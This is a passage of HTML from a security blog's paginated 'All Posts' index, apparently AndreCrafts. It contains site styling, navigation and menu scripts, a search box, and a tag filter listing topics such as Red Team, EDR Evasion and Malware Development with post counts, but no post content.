<!DOCTYPE html><html lang="en" data-mode="dark" class="scroll-smooth" data-astro-cid-ouamjn2i> <head><!-- Basic Meta Tags --><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="generator" content="Astro v5.14.4"><!-- Icons & Links --><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="icon" type="image/png" href="/favicon.png" sizes="96x96"><link rel="icon" href="/favicon.ico" sizes="any"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="sitemap" href="/sitemap-index.xml"><link rel="canonical" href="https://andrecrafts.com"><!-- Page Title & Description --><title>All Posts</title><meta name="description" content="A complete list of Posts by AndreCrafts"><!-- Social Media / Open Graph Tags --><meta property="og:title" content="All Posts | AndreCrafts"><meta property="og:description" content="A complete list of Posts by AndreCrafts"><meta property="og:type" content="website"><meta property="og:url" content="https://andrecrafts.com/posts/2/"><meta property="og:image" content="https://andrecrafts.com/images/social-preview.png"><meta property="twitter:card" content="summary_large_image"><link rel="stylesheet" href="/_astro/about.ngaCTfkb.css">
<style>@font-face{font-family:Inter;src:url(/fonts/Inter.ttf) format("truetype-variations");font-weight:100 900;font-display:swap;font-style:normal}@font-face{font-family:Montserrat;src:url(/fonts/Montserrat.ttf) format("truetype-variations");font-weight:100 900;font-display:swap;font-style:normal}header[data-astro-cid-3ef6ksr2]#main-header[aria-expanded=true],header[data-astro-cid-3ef6ksr2]#main-header[data-scrolled=true]{background-color:color-mix(in srgb,var(--colors-header) var(--un-bg-opacity),transparent);transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,--un-gradient-from,--un-gradient-via,--un-gradient-to;transition-timing-function:var(--un-ease, var(--default-transition-timingFunction));transition-duration:var(--un-duration, var(--default-transition-duration));--un-duration:.3s;transition-duration:.3s}@supports (color: color-mix(in lab,red,red)){header[data-astro-cid-3ef6ksr2]#main-header[aria-expanded=true],header[data-astro-cid-3ef6ksr2]#main-header[data-scrolled=true]{background-color:color-mix(in oklab,var(--colors-header) var(--un-bg-opacity),transparent)}}a[data-astro-cid-3ef6ksr2][aria-current=page]{color:var(--color-sky-500)}.highlight-btn[data-astro-cid-sz7xmlte]:hover{color:color-mix(in srgb,var(--colors-sky-400) var(--un-text-opacity),transparent)}@property --un-text-opacity{syntax:"<percentage>";inherits:false;initial-value:100%;}@supports (color: color-mix(in lab,red,red)){.highlight-btn[data-astro-cid-sz7xmlte]:hover{color:color-mix(in oklab,var(--colors-sky-400) var(--un-text-opacity),transparent)}}.tooltip-arrow[data-astro-cid-sz7xmlte]{background-color:color-mix(in srgb,var(--colors-secondary-accent) var(--un-bg-opacity),transparent);clip-path:polygon(50% 100%,0 0,100% 0)}@property --un-bg-opacity{syntax:"<percentage>";inherits:false;initial-value:100%;}@supports (color: color-mix(in lab,red,red)){.tooltip-arrow[data-astro-cid-sz7xmlte]{background-color:color-mix(in oklab,var(--colors-secondary-accent) var(--un-bg-opacity),transparent)}}:root{@media (min-width: 1024px){font-size:1.27rem}--background: hsl(214, 44%, 8%)}html{scroll-padding-top:3rem}
.dropdown-content[data-astro-cid-brbqhzh4]{visibility:hidden}.dropdown-container[data-astro-cid-brbqhzh4].dropdown-active .dropdown-content[data-astro-cid-brbqhzh4]{visibility:visible}.dropdown-container[data-astro-cid-brbqhzh4].dropdown-active .dropdown-trigger[data-astro-cid-brbqhzh4]{border-bottom-width:0;border-bottom-left-radius:0;border-bottom-right-radius:0}.active-view[data-astro-cid-vavxtnxe]{background-color:var(--color-sky-600);pointer-events:none;cursor:default}.active-selection[data-astro-cid-vavxtnxe]{border-left-width:2px;background-color:color-mix(in srgb,var(--colors-sky-600) 20%,transparent)}@property --un-bg-opacity{syntax:"<percentage>";inherits:false;initial-value:100%;}@supports (color: color-mix(in lab,red,red)){.active-selection[data-astro-cid-vavxtnxe]{background-color:color-mix(in oklab,var(--colors-sky-600) 20%,transparent)}}
</style></head> <body class="bg-background text-white font-sans selection:bg-sky-500 selection:text-white" data-astro-cid-ouamjn2i> <header id="main-header" data-scrolled="true" class="sticky top-0 z-50" data-astro-cid-3ef6ksr2> <div class="mx-auto px-4 py-1" data-astro-cid-3ef6ksr2> <div class="flex items-center justify-between -ml-1" data-astro-cid-3ef6ksr2> <!-- Logo --> <a href="/" class="flex items-center gap-1" data-astro-cid-3ef6ksr2> <img src="/images/logo.png" alt="AndreCrafts Logo" class="h-10 w-10 object-contain" data-astro-cid-3ef6ksr2> <span class="text-xl font-bold font-display text-white" data-astro-cid-3ef6ksr2>
AndreCrafts
</span> </a> <nav id="menu" class="
  bg-header absolute top-full left-0 w-full 
  border-t-1 border-white 
  hidden flex-col gap-4 p-4
  md:flex md:static md:w-auto md:bg-transparent
  md:border-t-0 md:flex-row md:items-center md:gap-8 md:p-0 " data-astro-cid-3ef6ksr2> <a href="/#services" class="text-white
           hover:text-sky-500 transition-colors duration-300" aria-current="false" data-astro-cid-3ef6ksr2> Services </a><a href="/work" class="text-white
           hover:text-sky-500 transition-colors duration-300" aria-current="false" data-astro-cid-3ef6ksr2> Work </a><a href="/about" class="text-white
           hover:text-sky-500 transition-colors duration-300" aria-current="false" data-astro-cid-3ef6ksr2> About </a> <a href="/#contact" class="
  text-center text-white font-bold px-3 py-1.5 rounded-md 
  bg-[linear-gradient(to_top_right,theme(colors.cyan.500),theme(colors.blue.600))] 
  hover:bg-[linear-gradient(to_top_right,theme(colors.cyan.400),theme(colors.blue.500))] 
  transition-all duration-300
" data-astro-cid-3ef6ksr2>
Contact
</a> </nav> <!-- Mobile Menu Button (Hamburger) --> <button id="mobile-menu-button" class="cursor-pointer text-white md:hidden" aria-controls="mobile-menu" aria-expanded="false" aria-label="Open main menu" data-astro-cid-3ef6ksr2> <svg class="h-6 w-6" id="hamburger-icon" data-astro-cid-3ef6ksr2="true" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path> </svg> <svg class="h-6 w-6 hidden" id="close-icon" data-astro-cid-3ef6ksr2="true" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path> </svg> </button> </div> </div> </header> <script type="module">function n(){const t=window.location.pathname,c=window.location.hash;document.querySelectorAll("#menu a").forEach(a=>{const i=new URL(a.href),s=i.pathname,o=i.hash,d=["/work","/posts","/projects"],r=t.endsWith("/")&&t.length>1?t.slice(0,-1):t;if(o==="#contact")return;let e=!1;o?e=o===c:s==="/work"?e=d.includes(r):s==="/"?e=r==="/":e=r===s,e?a.setAttribute("aria-current","page"):a.removeAttribute("aria-current")})}document.addEventListener("DOMContentLoaded",n);window.addEventListener("hashchange",n);window.addEventListener("urlchange",n);window.addEventListener("popstate",n);</script>  <script type="module">const e=document.getElementById("mobile-menu-button"),t=document.getElementById("menu"),i=document.getElementById("hamburger-icon"),d=document.getElementById("close-icon"),o=document.getElementById("main-header");function c(){if(!t||!i||!d||!e||!o)return;t.classList.toggle("hidden"),t.classList.toggle("flex"),i.classList.toggle("hidden"),d.classList.toggle("hidden");const n=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",String(!n)),o.setAttribute("aria-expanded",String(!n))}e&&t&&i&&d&&o&&(e.addEventListener("click",c),t.querySelectorAll("a").forEach(s=>{s.addEventListener("click",()=>{e.getAttribute("aria-expanded")==="true"&&c()})}));</script>  <main data-astro-cid-ouamjn2i> <!-- The content of the page will be injected here -->  <div class="text-center pt-4 pb-2" data-astro-cid-vavxtnxe> <h1 id="h1-title" class="text-4xl font-bold text-white" data-astro-cid-vavxtnxe>All Posts</h1> </div> <form id="filters-form" class="mb-10" data-astro-cid-vavxtnxe> <!-- Main container for all controls --> <div class="mx-auto px-4 md:px-36 flex flex-wrap items-center justify-center gap-2 mb-8" data-astro-cid-vavxtnxe> <div class="search-input flex items-center gap-1 justify-between cursor-pointer w-25 md:focus-within:w-35 p-2 rounded border-2 border-secondary-accent bg-header" data-astro-cid-vavxtnxe> <input id="search-input" type="text" name="q" placeholder="Search" class="placeholder:text-white placeholder:font-bold focus:placeholder:text-white/50 focus:placeholder:font-normal border-none outline-hidden md:focus:w-25 w-15" data-astro-cid-vavxtnxe> <svg class="text-white w-4.5 h-auto flex-shrink-0" data-astro-cid-vavxtnxe="true" fill="currentColor" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"> <path fill-rule="evenodd" clip-rule="evenodd" d="M17.0392 15.6244C18.2714 14.084 19.0082 12.1301 19.0082 10.0041C19.0082 5.03127 14.9769 1 10.0041 1C5.03127 1 1 5.03127 1 10.0041C1 14.9769 5.03127 19.0082 10.0041 19.0082C12.1301 19.0082 14.084 18.2714 15.6244 17.0392L21.2921 22.707C21.6828 23.0977 22.3163 23.0977 22.707 22.707C23.0977 22.3163 23.0977 21.6828 22.707 21.2921L17.0392 15.6244ZM10.0041 17.0173C6.1308 17.0173 2.99087 13.8774 2.99087 10.0041C2.99087 6.1308 6.1308 2.99087 10.0041 2.99087C13.8774 2.99087 17.0173 6.1308 17.0173 10.0041C17.0173 13.8774 13.8774 17.0173 10.0041 17.0173Z"></path> </svg> </div> <!-- TAG FILTER composed with GenericDropdown --> <div class="tag-filter-container" data-astro-cid-vavxtnxe> <div class="dropdown-container relative flex-grow" data-astro-cid-brbqhzh4> <!-- The trigger area that the user clicks. The parent defines its entire content. --> <div class="bg-header border-secondary-accent dropdown-trigger border-2 rounded cursor-pointer flex items-center" data-astro-cid-brbqhzh4> <div class="px-2 py-2 " data-astro-cid-vavxtnxe> <div class="flex items-center gap-2 justify-between cursor-pointer" data-astro-cid-vavxtnxe> <input type="text" placeholder="Search tags..." class="hidden w-30 tag-search-input border-none outline-hidden" data-astro-cid-vavxtnxe> <label class="font-bold cursor-pointer" data-astro-cid-vavxtnxe>Tags</label> <svg class="text-white w-5 h-auto flex-shrink-0" data-astro-cid-vavxtnxe="true" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="text-white"> <title>Filter</title> <g id="Page-1" stroke="currentColor" stroke-width="0" fill="none" fill-rule="evenodd"> <g id="Filter"> <rect id="Rectangle" fill-rule="nonzero" x="0" y="0" width="24" height="24"></rect> <line x1="4" y1="5" x2="16" y2="5" id="Path" stroke-width="2" stroke-linecap="round"></line> <line x1="4" y1="12" x2="10" y2="12" id="Path" stroke-width="2" stroke-linecap="round"></line> <line x1="14" y1="12" x2="20" y2="12" id="Path" stroke-width="2" stroke-linecap="round"></line> <line x1="8" y1="19" x2="20" y2="19" id="Path" stroke-width="2" stroke-linecap="round"></line> <circle id="Oval" stroke-width="1.5" stroke-linecap="round" cx="18" cy="5" r="2"></circle> <circle id="Oval" stroke-width="1.5" stroke-linecap="round" cx="12" cy="12" r="2"></circle> <circle id="Oval" stroke-width="1.5" stroke-linecap="round" cx="6" cy="19" r="2"></circle> </g> </g> </svg> </div> </div> </div> <!-- The content panel that is shown/hidden. The parent also defines its entire content. --> <div class="bg-header border-secondary-accent dropdown-content absolute z-50 w-full top-full shadow-lg max-h-60 overflow-y-auto px-2 py-1 border-2 border-t-0 rounded-b" data-astro-cid-brbqhzh4> <div class="tag-list-dropdown" data-astro-cid-vavxtnxe> <label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Red Team" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Red Team" id="tag-Red Team" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Red Team</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(13)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Programming" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Programming" id="tag-Programming" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Programming</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(11)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Hacking" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Hacking" id="tag-Hacking" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Hacking</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(8)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-C++" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="C++" id="tag-C++" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>C++</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(7)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-EDR Evasion" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="EDR Evasion" id="tag-EDR Evasion" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>EDR Evasion</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(7)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Malware Development" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Malware Development" id="tag-Malware Development" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Malware Development</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(7)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Python" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Python" id="tag-Python" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Python</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(6)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Cybersecurity" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Cybersecurity" id="tag-Cybersecurity" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Cybersecurity</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(4)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Malware" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Malware" id="tag-Malware" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Malware</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(4)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Shellcode" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Shellcode" id="tag-Shellcode" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Shellcode</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(4)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Active Directory" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Active Directory" id="tag-Active Directory" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Active Directory</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(3)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-AD Pentest" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="AD Pentest" id="tag-AD Pentest" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>AD Pentest</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-C" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="C" id="tag-C" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>C</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-CTF" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="CTF" id="tag-CTF" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>CTF</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Encryption" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Encryption" id="tag-Encryption" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Encryption</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Guide" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Guide" id="tag-Guide" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Guide</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Obfuscation" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Obfuscation" id="tag-Obfuscation" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Obfuscation</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Pentesting" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Pentesting" id="tag-Pentesting" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Pentesting</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Security Tools" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Security Tools" id="tag-Security Tools" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Security Tools</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Shellcode Loader" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Shellcode Loader" id="tag-Shellcode Loader" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Shellcode Loader</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-VulnLab" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="VulnLab" id="tag-VulnLab" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>VulnLab</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Walkthrough" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Walkthrough" id="tag-Walkthrough" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Walkthrough</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Web Pentest" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Web Pentest" id="tag-Web Pentest" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Web Pentest</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Write-up" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Write-up" id="tag-Write-up" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Write-up</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(2)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-.NET Framework" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value=".NET Framework" id="tag-.NET Framework" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>.NET Framework</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-ACL" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="ACL" id="tag-ACL" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>ACL</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-API Security" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="API Security" id="tag-API Security" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>API Security</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-API Testing" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="API Testing" id="tag-API Testing" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>API Testing</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-ArgoCD" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="ArgoCD" id="tag-ArgoCD" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>ArgoCD</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-ASM" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="ASM" id="tag-ASM" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>ASM</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Astro" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Astro" id="tag-Astro" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Astro</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-AV Evasion" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="AV Evasion" id="tag-AV Evasion" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>AV Evasion</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-AWS" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="AWS" id="tag-AWS" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>AWS</div> <span class="text-slate-400 